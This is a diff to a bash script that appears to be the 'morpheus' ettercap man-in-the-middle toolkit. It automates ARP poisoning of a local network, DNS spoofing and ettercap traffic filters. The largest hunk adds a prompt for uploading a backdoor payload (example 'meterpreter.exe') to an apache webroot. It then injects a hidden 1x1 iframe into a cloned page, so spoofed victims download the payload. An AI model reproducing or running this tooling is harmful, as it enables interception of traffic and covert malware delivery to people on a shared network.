@@ -179,10 +179,10 @@ rm $IPATH/output/template.ef > /dev/null 2>&1
 rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
 rm $IPATH/output/img_replace.ef > /dev/null 2>&1
 # revert filters to default stage
-mv $IPATH/filters/firewall.bk $IPATH/filters/firewall.eft > /dev/null 2>&1
-mv $IPATH/filters/template.bk $IPATH/filters/template.eft > /dev/null 2>&1
-mv $IPATH/filters/packet_drop.bk $IPATH/filters/packet_drop.eft > /dev/null 2>&1
-mv $IPATH/filters/img_replace.bk $IPATH/filters/img_replace.eft > /dev/null 2>&1
+mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
+mv $IPATH/filters/template.rb $IPATH/filters/template.eft > /dev/null 2>&1
+mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
+mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
 # revert ettercap conf files to default stage
 if [ -e $Edns ]; then
 mv /tmp/etter.dns $Edns > /dev/null 2>&1
@@ -222,7 +222,7 @@ rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison setti
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-  cp $IPATH/filters/packet_drop.eft $IPATH/filters/packet_drop.bk > /dev/null 2>&1
+  cp $IPATH/filters/packet_drop.eft $IPATH/filters/packet_drop.rb > /dev/null 2>&1
   sleep 1
 
   echo ${BlueF}[☠]${white} Edit packet_drop.eft '(filter)'${RedF}!${Reset};
@@ -270,7 +270,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/packet_drop.bk $IPATH/filters/packet_drop.eft > /dev/null 2>&1
+  mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
@@ -311,9 +311,9 @@ fil_one=$(zenity --title="☠ DOMAIN TO SPOOF ☠" --text "example: $IP\nWARNING
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
-  cp $IPATH/bin/etter.dns etter.bk > /dev/null 2>&1 # backup
+  cp $IPATH/bin/etter.dns etter.rb > /dev/null 2>&1 # backup
   cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
-  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.bk > /dev/null 2>&1 # backup
+  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.rb > /dev/null 2>&1 # backup
   # use SED bash command to config our etter.dns
   sed -i "s|TaRgEt|$fil_one|g" etter.dns # NO dev/null to report file not existence :D
   sed -i "s|TaRgEt|$fil_one|g" etter.dns > /dev/null 2>&1
@@ -362,8 +362,8 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
   rm $IPATH/output/redirect.ef > /dev/null 2>&1
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
-  mv $IPATH/bin/etter.bk $IPATH/bin/etter.dns > /dev/null 2>&1
-  mv $IPATH/filters/redirect.bk $IPATH/filters/redirect.eft > /dev/null 2>&1 # backup
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
+  mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft > /dev/null 2>&1 # backup
   cd $IPATH
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -398,26 +398,39 @@ if [ "$?" -eq "0" ]; then
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
-dIc=$(zenity --title="☠ BACKDOOR AGENT NAME ☠" --text "example:meterpreter.exe\nUpload malicious executable to apache2 and input is name" --entry --width 270) > /dev/null 2>&1
-
+UpL=$(zenity --title "☠ PAYLOAD TO BE UPLOADED ☠" --filename=$IPATH --file-selection --text "chose payload to be uploded\nexample:meterpreter.exe") > /dev/null 2>&1
+dIc=$(zenity --title="☠ PAYLOAD NAME ☠" --text "Enter payload to be uploaded name\nexample:meterpreter.exe" --entry --width 270) > /dev/null 2>&1
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
-  cp $IPATH/bin/etter.dns etter.bk # backup (NO dev/null to report file not existence)
+  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
   cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
   # using bash SED to inject our malicious <iframe>
   sed "s|<\/body>|<iframe width=\"1\" height=\"1\" frameborder=\"0\" src=\"http://$IP/$dIc\"><\/iframe><\/body>|" clone.html > index.html
   # copy files to apache2 webroot
   mv index.html $ApachE/index.html > /dev/null 2>&1
-  cp googlelogo_white_background_color_272x92dp.png $ApachE > /dev/null 2>&1
+  cp miss.png $ApachE > /dev/null 2>&1
+  cp $UpL $ApachE > /dev/null 2>&1
   # use SED bash command to config our etter.dns
   sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
   cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
   echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
   cd $IPATH
   sleep 1
+
+
+# IF NOT EXIST FILE IN APACHE, ABORT..
+if ! [ -e $ApachE/$dIc ]; then
+echo ${RedF}[x]${white} Backdoor:${RedF}$dIc ${white}not found...${Reset};
+sleep 3
+cd $ApachE
+rm *.exe
+rm $ApachE/miss.png > /dev/null 2>&1
+cd $IPATH
+sh_exit # jump to exit ...
+fi
 
 # start apache2 webserver...
 echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
@@ -452,8 +465,8 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
-  mv $IPATH/bin/etter.bk $IPATH/bin/etter.dns > /dev/null 2>&1
-  rm $ApachE/googlelogo_white_background_color_272x92dp.png > /dev/null 2>&1
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
+  rm $ApachE/miss.png > /dev/null 2>&1
   cd $IPATH
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
@@ -486,7 +499,7 @@ if [ "$?" -eq "0" ]; then
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
 echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.bk > /dev/null 2>&1
+cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.rb > /dev/null 2>&1
 sleep 1
 
   echo ${BlueF}[☠]${white} Edit img_replace.eft '(filter)'${RedF}!${Reset};
@@ -536,7 +549,7 @@ sleep 1
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/img_replace.bk $IPATH/filters/img_replace.eft > /dev/null 2>&1
+  mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
@@ -574,7 +587,7 @@ rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison setti
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-  cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.bk > /dev/null 2>&1
+  cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.rb > /dev/null 2>&1
   sleep 1
 
   echo ${BlueF}[☠]${white} Edit firewall.eft '(filter)'${RedF}!${Reset};
@@ -635,7 +648,7 @@ fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose fi
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/firewall.bk $IPATH/filters/firewall.eft > /dev/null 2>&1
+  mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
@@ -673,7 +686,7 @@ rhost=$(zenity --title="☠ Enter RHOST ☠" --text "'morpheus arp poison settin
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-  cp $IPATH/filters/template.eft $IPATH/filters/template.bk > /dev/null 2>&1
+  cp $IPATH/filters/template.eft $IPATH/filters/template.rb > /dev/null 2>&1
   sleep 1
 
   echo ${BlueF}[☠]${white} Edit template '(filter)'${RedF}!${Reset};
@@ -715,7 +728,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/template.bk $IPATH/filters/template.eft > /dev/null 2>&1
+  mv $IPATH/filters/template.rb $IPATH/filters/template.eft > /dev/null 2>&1
   # port-forward
   # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
@@ -806,12 +819,16 @@ echo ${BlueF}[☠]${white} Exit morpheus${RedF}:${white}[ $cnm ] ${Reset};
 sleep 1
 echo ${BlueF}[☠]${white} Revert ettercap etter.conf ${GreenF}✔${white} ${Reset};
 mv /tmp/etter.conf $Econ > /dev/null 2>&1
+mv /tmp/etter.dns $Edns > /dev/null 2>&1
 sleep 2
 clear
 exit
 }
 
 
+sh_main () {
+clear
+}
 
 Colors;
 # -----------------------------
